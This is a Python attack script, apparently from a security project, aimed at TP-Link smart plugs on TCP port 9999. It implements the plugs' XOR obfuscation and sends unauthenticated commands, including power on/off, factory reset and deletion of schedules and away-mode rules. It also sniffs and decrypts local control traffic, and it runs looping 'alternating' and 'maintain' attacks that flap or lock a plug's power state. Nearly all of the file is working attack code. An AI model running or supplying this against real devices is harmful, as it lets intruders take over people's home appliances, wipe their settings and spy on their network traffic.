#!/usr/bin/env python3

from scapy.all import *
from binascii import unhexlify
from time import sleep
import nmap3
import socket
import os
import signal
import sys
import threading

class Spinner:
  busy = False
  delay = 0.1

  @staticmethod
  def spinning_cursor():
    while True:
      for cursor in '|/-\\':
        yield cursor

  def __init__(self):
    self.spinner = self.spinning_cursor()

  def spinner_task(self):
    while self.busy:
      sys.stdout.write(next(self.spinner))
      sys.stdout.flush()
      sleep(self.delay)
      sys.stdout.write('\b')
      sys.stdout.flush()

  def __enter__(self):
    self.busy = True
    self.t = threading.Thread(target=self.spinner_task)
    self.t.start()

  def __exit__(self, exception, value, tb):
    self.busy=False
    self.t.join()
    if exception is not None:
      return False


class TP_Link_Attack():
  victim_port = 9999
  iface= None
  repeat = False

  commands = {
    'on': '{"system":{"set_relay_state":{"state":1}}}',
    'off': '{"system":{"set_relay_state":{"state":0}}}',
    'sysinfo' : '{"system":{"get_sysinfo":{}}}',
    'setAlias' : '{"system":{"set_dev_alias":{"alias":"name"}}}',
    'reset' : '{"system":{"reset":{"delay":0}}}',
    'cnCloud': '{"cnCloud":{"get_info":{}}}',
    'netif': '{"netif":{"get_scaninfo":{}}}',
    'emeter' : '{"emeter":{"get_realtime":{}}}',
    'time' : '{"time":{"get_time":{}}}',
    'timeZone' : '{"time":{"get_timezone":{}}}',
    'countdownGet' : '{"count_down":{"get_rules":{}}}',
    'countdownDelete' : '{"count_down":{"delete_all_rules":{}}}',
    'scheduleGet' : '{"schedule":{"get_rules":{}}}',
    'scheduleDelete' : '{"schedule":{"delete_all_rules":{}}}',
    'awayModeGet' : '{"anti_theft":{"get_rules":{}}}',
    'awayModeDelete' : '{"anti_theft":{"delete_all_rules":{}}}',
  }


  # @param iface  Network interface of attacker.
  def __init__(self, iface):
    self.iface = iface
    #self.on_cmd = self.construct_switch_cmd(on=True)
    #self.off_cmd = self.construct_switch_cmd(on=False)

    signal.signal(signal.SIGINT, self.signal_handler)
    

  def signal_handler(self, sig, frame):
    if not self.repeat:
      raise KeyboardInterrupt
    else:
      self.repeat = False


  # Given a plaintext, encrypt it so it can be accepted by the device
  @staticmethod
  def encrypt(plaintext):
    key = 171
    ciphertext = (hex(len(plaintext))[2:]).zfill(8)

    for i in range(0, len(plaintext)):
      ciphertext += format((ord(plaintext[i]) ^ key), 'x')
      key = ord(plaintext[i]) ^ key

    return ciphertext


  # Given a ciphertext (related to the device; we aren't qualified to crack AES), return a decoded string
  @staticmethod
  def decrypt(ciphertext):
    key = 171
    plaintext = ""

    if (len(ciphertext) <= 8):
      return plaintext

    for i in range(8, len(ciphertext), 2):
      plaintext += chr(int(ciphertext[i:(i+2)], 16) ^ key)
      key = int(ciphertext[i:(i+2)], 16)

    return plaintext


  # Constructs a valid switch JSON command. 
  # NOTE: UNNECESSARY
  def construct_switch_cmd(self, on=False):
    return "{\"context\":{\"source\":\"" + \
        self.victim_id + \
        "\"},\"system\":{\"set_relay_state\":{\"state\":" + \
        str(int(on)) + \
        "}}}"

  
  # Sends to the victim the binary representation of the provided JSON command
  # NOTE: Uses only one TCP session to send JSON
  def send_json(self, ip, json, timeout=2):
    return self.send_single_payload(ip, unhexlify(self.encrypt(json)), timeout)


  # Given a valid key of self.commands, send that command and return the reply
  # Parameters:
  #   alias="name" : The name to change the device's alias when used with the "setAlias" command
  #   delay=0      : Seconds until device reset when used with the "reset" command
  # NOTE: Uses only one TCP session
  def send_cmd(self, ip, key, timeout=2, **kwargs):
    if (not key in self.commands.keys()):
      print("Invalid Command")
      return None
    
    payload = self.commands[key]

    if "alias" in kwargs and key == "setAlias":
      payload = payload.replace("name", str(kwargs.get("alias")))
    elif "delay" in kwargs and key == "reset":
      payload = payload.replace("0", str(int(kwargs.get("delay"))))

    return self.send_single_payload(ip, unhexlify(self.encrypt(payload)), timeout) 


  # Establishes a TCP connection with the victim and sends the payload
  # After the payload has been sent, terminate the current TCP session
  # NOTE: Ensure 'payload' is binary data
  def send_single_payload(self, ip, payload, timeout=2):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, self.victim_port))
      ss = StreamSocket(s)

      #s.send(payload)

      #ss.send(Raw(payload))

      # Get status report
      #pkt = ss.sniff(iface=self.iface, timeout=timeout, count=1, filter="tcp[tcpflags] & tcp-push != 0")

      pkt = ss.sr1(Raw(payload), timeout=timeout, verbose=0)

    return pkt

 
  # sniffs and decrypts packets coming to and from controlling devices on the subnet
  # NOTE: Does NOT decrypt TLS streams from remote server to TP_LINK device 
  def sniff_and_decrypt(self, ip):
    # PSH = 0x08
    custom_filter = lambda pkt: pkt.haslayer(IP) and pkt.haslayer(TCP) and \
        ((pkt[IP].dst == ip and pkt[TCP].dport == self.victim_port and pkt[TCP].flags & 0x08) or \
        (pkt[IP].src == ip and pkt[TCP].sport == self.victim_port and pkt[TCP].flags & 0x08))
    printer = lambda pkt: pkt[IP].src + " -> " + pkt[IP].dst + "\n" + self.decrypt(raw(pkt[Raw]).hex()) + "\n" \
        if pkt[IP].dst == ip else \
        pkt[IP].dst + " <- " + pkt[IP].src + "\n" + self.decrypt(raw(pkt[Raw]).hex()) + "\n"

    sniff(iface=self.iface, lfilter=custom_filter, prn=printer)
    print("\nSniffing stopped...\n")


  # After 'delay' seconds, send a command that toggles the device
  # (on -> off -> on -> off ...) 
  # Continious mode: more stable and faster; uses one continuous TCP session with the victim
  def alternating_attack(self, ip, delay=0.5, continuous=True, timeout=2):
    toggle = False
    self.repeat = True

    print("Starting alternating attack...")
    
    try:
      with Spinner():
        # Use multiple TCP connections to execute the attack
        if not continuous:
          while self.repeat:
            if toggle:
              self.send_cmd(ip, "on", timeout=timeout)
            else:
              self.send_cmd(ip, "off", timeout=timeout)
            toggle = not toggle

            sleep(delay)
        else:
          # Use one continuous TCP session to execute the attack
          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout) # Doesn't work for some reason...
            s.connect((ip, self.victim_port))
            ss = StreamSocket(s)
            while self.repeat:
              if toggle:
                pkt = ss.sr1(Raw(unhexlify(self.encrypt(self.commands['on']))), timeout=timeout, verbose=0)
              else:
                pkt = ss.sr1(Raw(unhexlify(self.encrypt(self.commands['off']))), timeout=timeout, verbose=0)

              toggle = not toggle 

              if pkt == None:
                self.repeat = False
                raise socket.timeout

              sleep(delay)
    except socket.timeout:
      self.repeat = False
      print("\nSocket Timeout: host is unresponsive")
    except OSError as e:
      self.repeat = False
      print(os.strerror(e.errno))

    print("\nAlternating attack stopped")


  
  # Send commands to the device that makes it maintain its state.
  # Continious mode: uses one continuous TCP connection and sends a command every $delay seconds.
  # Non-continuous mode: wait to resend command when activity happens with device (e.g. notifying app)
  def maintain_attack(self, ip, on=False, continuous=False, delay=1, timeout=2):
    # True if packets are related to the victim and that a FIN flag exists (TCP)
    # Helps prevent flooding the network
    #fin_filter = lambda pkt: pkt.haslayer(IP) and \
    #    (pkt[IP].dst == ip or pkt[IP].src == ip) and \
    #    (pkt[IP].dst != get_if_addr(self.iface) or pkt[IP].src != get_if_addr(self.iface)) and \
    #    pkt.haslayer(TCP) and (pkt[TCP].flags & 0x01)

    self.repeat = True

    print("Starting maintain attack...")

    try:
      with Spinner():
        if not continuous:
          while self.repeat:
            if on:
              self.send_cmd(ip, "on", timeout=timeout)
            else:
              self.send_cmd(ip, "off", timeout=timeout)

            sleep(delay)

            # Wait until someone turned it on or off
            #sniff(iface=self.iface, count=1, timeout=delay, lfilter=fin_filter)
        else:
          # Use one continuous TCP session to execute the attack
          # Sends (on/off) cmd every 1 seconds
          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, self.victim_port))
            ss = StreamSocket(s)
            while self.repeat:
              if on:
                pkt = ss.sr1(Raw(unhexlify(self.encrypt(self.commands['on']))), timeout=timeout, verbose=0)
              else:
                pkt = ss.sr1(Raw(unhexlify(self.encrypt(self.commands['off']))), timeout=timeout, verbose=0)

              if pkt == None:
                self.repeat = False
                raise socket.timeout

              sleep(delay)
    except socket.timeout:
      self.repeat = False
      print("\nSocket Timeout: host is unresponsive")
    except OSError as e:
      self.repeat = False
      print(os.strerror(e.errno))


    print("\nMaintain attack terminated")


# FOR TESTING ONLY
t = TP_Link_Attack("wlan0")

